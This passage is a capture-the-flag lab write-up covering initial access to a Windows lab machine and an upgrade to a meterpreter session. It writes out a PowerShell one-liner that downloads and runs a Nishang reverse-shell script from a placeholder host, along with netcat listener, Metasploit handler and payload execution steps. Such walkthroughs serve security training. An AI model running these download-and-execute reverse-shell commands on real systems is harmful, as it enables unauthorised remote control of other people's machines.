We will make use of the [reverse shell script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) provided in the exerise. We first set up a web server on port 9999:

<center>

![d135c1b5422b75eb6d5b67c8c0f4a092.png](../../_resources/d135c1b5422b75eb6d5b67c8c0f4a092-1.png)

</center>

Set up a netcat listener on a different port with ``nc -lvnp 8888`` then execute the following command

```ps
powershell iex (New-Object Net.WebClient).DownloadString('http://LOCAL_IP:9999/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress LOCAL_IP -Port 8888
```

using the feature we found in the enumeration phase. Our netcat listener will catch the reverse shell, giving us initial access to the machine.

<center>

![1572bfd20feeccdf3a2075f2160176fe.png](../../_resources/1572bfd20feeccdf3a2075f2160176fe-1.png)

</center>

Digging around, we eventually find the user.txt file in ``C:\Users\bruce\Desktop``.

<center>

![9ca6197a960a87ec9973d760e8b3c825.png](../../_resources/9ca6197a960a87ec9973d760e8b3c825-1.png)

</center>

Using ``type user.txt`` gives us our flag.

As part of Task 2, we are asked to switch to a meterpreter shell in order to facilitate easier privilege escalation. We generate an x86-64 reverse shell using msfvenom:

<center>

![00cf123b41d92301f44b5cc4ab6244ba.png](../../_resources/00cf123b41d92301f44b5cc4ab6244ba-1.png)

</center>

Note that this gives us the answer to the only question in Task 2. We download the .exe file on the target machine using the same technique used in Task 1. Now set up a handler in Metasploit with ``use exploit/multi/handler`` with the following options:

<center>

![e18242f0bff037e0f026b24a82b01662.png](../../_resources/e18242f0bff037e0f026b24a82b01662-1.png)

</center>

Now ``run``  to start the reverse TCP handler. On our target machine, we navigate to the directory containing our msfvenom payload and execute  ``Start-Process task2shell.exe`` . This gives us a meterpreter session:

<center>

![aeab9f9383a0bda9bdecac00b6f03c87.png](../../_resources/aeab9f9383a0bda9bdecac00b6f03c87-1.png)

</center>

(Note: The target IP is a bit different here, as I had to reset the machine.)